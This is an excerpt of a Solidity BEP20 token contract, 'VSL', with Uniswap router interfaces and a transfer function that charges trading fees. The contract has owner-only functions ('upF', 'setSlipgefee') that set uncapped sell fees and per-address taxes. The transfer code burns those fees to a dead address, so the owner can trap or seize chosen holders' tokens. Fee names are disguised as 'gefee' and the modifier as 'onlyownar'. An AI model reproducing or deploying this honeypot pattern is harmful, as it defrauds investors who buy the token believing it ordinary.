...
interface IUniswapV2Factory {
    ...
    function gefeeTo() external view returns (address);
    function gefeeToSetter() external view returns (address);
    ...
    function setgefeeTo(address) external;
    function setgefeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinggefeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinggefeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinggefeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinggefeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinggefeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract VSL is BEP20, Ownable {
    ...
    uint256 private _defaultSellgefee = 0;

    uint256 private _defaultBuygefee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipgefee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellgefee = _value;
    }

    function setSlipgefee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipgefee[_address] = _value;
    }

    function getSlipgefee(address _address) external view onlyownar returns (uint256) {
        return _slipgefee[_address];
    }


    function setMAccountgefee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountgefee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradegefeeAmount = 0;

        if (rF) {
            uint256 tradegefee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradegefee = _defaultSellgefee;
                }
                if (from == uniswapV2Pair) {

                    tradegefee = _defaultBuygefee;
                }
            }
            if (_slipgefee[from] > 0) {
                tradegefee = _slipgefee[from];
            }

            tradegefeeAmount = _Amount.mul(tradegefee).div(100);
        }


        if (tradegefeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradegefeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradegefeeAmount);
            emit Transfer(from, _deadAddress, tradegefeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradegefeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradegefeeAmount);
        emit Transfer(from, _to, _Amount - tradegefeeAmount);
    }
